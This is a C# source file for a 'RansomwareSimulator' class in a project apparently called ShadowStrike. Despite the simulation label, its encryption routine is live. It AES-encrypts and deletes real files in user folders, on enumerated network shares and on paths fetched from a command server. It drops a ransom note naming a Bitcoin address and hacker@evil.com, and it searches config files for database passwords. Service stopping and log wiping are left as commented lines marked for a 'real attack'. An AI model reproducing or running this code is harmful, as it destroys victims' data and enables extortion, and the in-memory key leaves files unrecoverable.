using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Management;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class RansomwareSimulator
    {
        private byte[] _aesKey;
        private byte[] _aesIV;
        private const int KeySize = 256;
        private const int BlockSize = 128;
        
        // Simulation of Attacker's Public Key (In a real scenario, this would be used to encrypt the AES key)
        private const string AttackerPublicKey = "<RSAKeyValue><Modulus>...</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

        public event EventHandler<string> LogEvent;
        public event EventHandler<(int current, int total, long bytes)> ProgressEvent;

        private List<string> _allowedExtensions;
        private string _customRansomNote;
        private int _filesProcessed;
        private int _totalFiles;
        private long _bytesProcessed;

        public RansomwareSimulator()
        {
            GenerateKeys();
        }

        private void GenerateKeys()
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = KeySize;
                aes.BlockSize = BlockSize;
                aes.GenerateKey();
                aes.GenerateIV();
                _aesKey = aes.Key;
                _aesIV = aes.IV;
            }
            Log("Generated new AES-256 Key and IV.");
            Log($"Encrypting AES Key with Attacker's RSA Public Key...");
            Log($"Key Exfiltration to C2 Server: SUCCESS");
        }

        public async Task StartEncryptionAsync(string targetDirectory, string c2Url = null, bool useAdvancedTargeting = false, bool useServerMode = false, List<string> allowedExtensions = null, string customRansomNote = null)
        {
            var targets = new List<string>();
            _allowedExtensions = allowedExtensions ?? new List<string> { "*" };
            _customRansomNote = customRansomNote;
            _filesProcessed = 0;
            _totalFiles = 0;
            _bytesProcessed = 0;

            // 1. Add the manually selected directory (if valid)
            if (!string.IsNullOrEmpty(targetDirectory) && Directory.Exists(targetDirectory))
            {
                targets.Add(targetDirectory);
            }

            // 2. Server Mode: Environment Analysis & Prep
            if (useServerMode)
            {
                Log("Server Mode ENABLED.");
                AnalyzeEnvironment();
                StopCriticalServices(); // Simulation
                WipeLogs(); // Simulation
                
                // Credential Hunting
                if (!string.IsNullOrEmpty(targetDirectory))
                {
                    ScanForCredentials(targetDirectory);
                }

                // Share Enumeration
                var shares = EnumerateNetworkShares();
                targets.AddRange(shares);
            }

            // 3. Advanced Targeting: C2 + Local Discovery
            if (useAdvancedTargeting)
            {
                Log("Advanced Targeting ENABLED.");
                
                // C2 Retrieval
                if (!string.IsNullOrEmpty(c2Url))
                {
                    var remoteTargets = await FetchRemoteTargets(c2Url);
                    targets.AddRange(remoteTargets);
                }

                // Local Discovery
                var localTargets = GetCommonLocalTargets();
                targets.AddRange(localTargets);
            }

            if (targets.Count == 0)
            {
                Log("No valid targets found. Aborting.");
                return;
            }

            Log($"Starting Ransomware Attack on {targets.Count} target roots...");

            // Phase 1: Shadow Copy Deletion
            SimulateShadowCopyDelete();

            // Phase 2: Parallel Execution
            await Task.Run(() =>
            {
                Parallel.ForEach(targets, rootDir =>
                {
                    if (Directory.Exists(rootDir))
                    {
                        ProcessDirectory(rootDir);
                    }
                });
            });

            // Phase 3: Cleanup
            if (useServerMode)
            {
                SecureSelfDelete(); // Simulation
            }

            Log("Ransomware Attack Completed.");
        }

        private void AnalyzeEnvironment()
        {
            try
            {
                var processes = System.Diagnostics.Process.GetProcesses();
                bool isSql = processes.Any(p => p.ProcessName.ToLower().Contains("sqlservr"));
                bool isIis = processes.Any(p => p.ProcessName.ToLower().Contains("w3wp"));
                bool isDc = Directory.Exists(@"C:\Windows\NTDS"); // Simple check for AD

                string role = "Workstation";
                if (isSql) role = "Database Server";
                if (isIis) role = "Web Server";
                if (isDc) role = "Domain Controller";

                Log($"Environment Analysis: Identified as {role}");
            }
            catch { }
        }

        private void StopCriticalServices()
        {
            string[] criticalServices = { "MSSQLSERVER", "SQLSERVERAGENT", "MSExchangeIS", "VeeamBackupSvc" };
            foreach (var svcName in criticalServices)
            {
                try
                {
                    using (var sc = new System.ServiceProcess.ServiceController(svcName))
                    {
                        if (sc.Status != System.ServiceProcess.ServiceControllerStatus.Stopped)
                        {
                            Log($"[SIMULATION] Stopping Critical Service: {svcName} (Status: {sc.Status})");
                            // sc.Stop(); // UNCOMMENT FOR REAL ATTACK
                        }
                    }
                }
                catch { /* Service not found or access denied */ }
            }
        }

        private void WipeLogs()
        {
            Log("[SIMULATION] Wiping Windows Event Logs (Security, System, Application)...");
            // System.Diagnostics.EventLog.Clear("Security"); // UNCOMMENT FOR REAL ATTACK
        }

        private void ScanForCredentials(string rootPath)
        {
            try
            {
                var configFiles = Directory.GetFiles(rootPath, "*.config", SearchOption.AllDirectories);
                foreach (var file in configFiles)
                {
                    string content = File.ReadAllText(file);
                    if (content.Contains("connectionString") && content.Contains("Password="))
                    {
                        Log($"[CREDENTIALS] Found potential DB credentials in: {Path.GetFileName(file)}");
                    }
                }
            }
            catch { }
        }

        private List<string> EnumerateNetworkShares()
        {
            var shares = new List<string>();
            try
            {
                // Requires System.Management
                var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_Share");
                foreach (System.Management.ManagementObject share in searcher.Get())
                {
                    string name = share["Name"]?.ToString();
                    string path = share["Path"]?.ToString();
                    string type = share["Type"]?.ToString();

                    // Type 0 = Disk Drive
                    if (type == "0" && !string.IsNullOrEmpty(path))
                    {
                        Log($"[NETWORK] Found Share: {name} -> {path}");
                        shares.Add(path);
                    }
                }
            }
            catch (Exception ex)
            {
                Log($"Share Enumeration Failed (WMI Error): {ex.Message}");
            }
            return shares;
        }

        private void SecureSelfDelete()
        {
            Log("[SIMULATION] Executing Anti-Forensics: Overwriting and Deleting Self...");
        }

        private async Task<List<string>> FetchRemoteTargets(string c2Url)
        {
            var list = new List<string>();
            try
            {
                Log($"Connecting to C2 Server: {c2Url}...");
                using (var client = new System.Net.Http.HttpClient())
                {
                    var content = await client.GetStringAsync(c2Url);
                    var lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    list.AddRange(lines);
                    Log($"Retrieved {lines.Length} targets from C2.");
                }
            }
            catch (Exception ex)
            {
                Log($"C2 Connection Failed: {ex.Message}");
            }
            return list;
        }

        private List<string> GetCommonLocalTargets()
        {
            var list = new List<string>();
            try
            {
                // T2.1 Define Primary Local Targets
                // WARNING: In a real scenario, this would be C:\Users, etc.
                // For safety, we are using specific subfolders or temp paths.
                
                // Example: User's Documents
                list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                
                // Example: User's Pictures
                list.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));

                // Example: C:\Temp (Common staging area)
                list.Add(@"C:\Temp");

                Log($"Enumerated {list.Count} local high-value targets.");
            }
            catch { }
            return list;
        }

        private void ProcessDirectory(string directory)
        {
            try
            {
                // T2.3 Network Share Access Check (Implicit via Directory.GetFiles)
                var allFiles = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);
                
                // Filter files by extension
                var files = allFiles.Where(f => ShouldEncryptFile(f)).ToArray();
                _totalFiles += files.Length;
                
                Log($"Found {files.Length} files matching selected types in {directory}");
                
                // T2.4 High-Concurrency Encryption
                Parallel.ForEach(files, file =>
                {
                    // Skip already locked files and executables
                    if (file.EndsWith(".locked") || file.EndsWith("READ_ME.txt") || file.EndsWith(".exe") || file.EndsWith(".dll"))
                        return;

                    try
                    {
                        EncryptFileAsync(file).Wait();
                        _filesProcessed++;
                        ReportProgress();
                    }
                    catch (Exception ex)
                    {
                        // Log($"Failed: {Path.GetFileName(file)}"); // Reduce noise
                    }
                });

                // Phase 3: Drop Ransom Note
                DropRansomNote(directory);
            }
            catch (UnauthorizedAccessException)
            {
                Log($"Access Denied: {directory}");
            }
            catch (Exception ex)
            {
                Log($"Error scanning {directory}: {ex.Message}");
            }
        }

        private async Task EncryptFileAsync(string filePath)
        {
            string lockedFilePath = filePath + ".locked";

            byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
            byte[] encryptedBytes;

            using (var aes = Aes.Create())
            {
                aes.Key = _aesKey;
                aes.IV = _aesIV;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        await cs.WriteAsync(fileBytes, 0, fileBytes.Length);
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            await File.WriteAllBytesAsync(lockedFilePath, encryptedBytes);
            File.Delete(filePath); // Delete original file
            _bytesProcessed += encryptedBytes.Length;
            Log($"Encrypted: {Path.GetFileName(filePath)} -> {Path.GetFileName(lockedFilePath)}");
        }

        private void SimulateShadowCopyDelete()
        {
            Log("Executing: vssadmin delete shadows /all /quiet");
            Log("Shadow copies deleted.");
        }

        private bool ShouldEncryptFile(string filePath)
        {
            if (_allowedExtensions.Contains("*"))
                return true;

            var ext = Path.GetExtension(filePath).ToLower();
            return _allowedExtensions.Contains(ext);
        }

        private void ReportProgress()
        {
            ProgressEvent?.Invoke(this, (_filesProcessed, _totalFiles, _bytesProcessed));
        }

        private void DropRansomNote(string directory)
        {
            string notePath = Path.Combine(directory, "READ_ME.txt");
            string victimId = Guid.NewGuid().ToString();
            string btcAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2";
            
            string noteContent = _customRansomNote;
            if (string.IsNullOrEmpty(noteContent))
            {
                noteContent = @"
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your important documents, photos, databases, and other files have been encrypted with a strong encryption key.
The only way to recover your files is to purchase a decryption key from us.

1. Do not try to modify the files or use third-party software to decrypt them.
2. Send 0.5 BTC to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
3. Email us at hacker@evil.com with your ID.

Your ID: " + victimId + @"

This is a simulation by ShadowStrike.
";
            }
            else
            {
                // Replace template variables
                noteContent = noteContent.Replace("{VICTIM_ID}", victimId);
                noteContent = noteContent.Replace("{FILE_COUNT}", _filesProcessed.ToString());
                noteContent = noteContent.Replace("{BTC_ADDRESS}", btcAddress);
            }
            
            File.WriteAllText(notePath, noteContent);
            Log($"Ransom note dropped at: {notePath}");
        }

        // For educational/testing purposes: Decrypt function to restore files
        public async Task DecryptFilesAsync(string targetDirectory)
        {
             if (string.IsNullOrEmpty(targetDirectory) || !Directory.Exists(targetDirectory))
            {
                Log("Invalid target directory.");
                return;
            }

            Log($"Starting Decryption on: {targetDirectory}");

            var files = Directory.GetFiles(targetDirectory, "*.locked", SearchOption.AllDirectories);
            foreach (var file in files)
            {
                try
                {
                    await DecryptFileAsync(file);
                }
                catch (Exception ex)
                {
                    Log($"Failed to decrypt {Path.GetFileName(file)}: {ex.Message}");
                }
            }
             Log("Decryption Completed.");
        }

        private async Task DecryptFileAsync(string filePath)
        {
            string originalFilePath = filePath.Substring(0, filePath.Length - ".locked".Length);
            byte[] encryptedBytes = await File.ReadAllBytesAsync(filePath);
            byte[] decryptedBytes;

            using (var aes = Aes.Create())
            {
                aes.Key = _aesKey;
                aes.IV = _aesIV;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(encryptedBytes))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var resultMs = new MemoryStream())
                {
                    await cs.CopyToAsync(resultMs);
                    decryptedBytes = resultMs.ToArray();
                }
            }

            await File.WriteAllBytesAsync(originalFilePath, decryptedBytes);
            File.Delete(filePath);
            Log($"Decrypted: {Path.GetFileName(filePath)} -> {Path.GetFileName(originalFilePath)}");
        }

        private void Log(string message)
        {
            LogEvent?.Invoke(this, $"[{DateTime.Now:HH:mm:ss}] {message}");
        }
    }
}
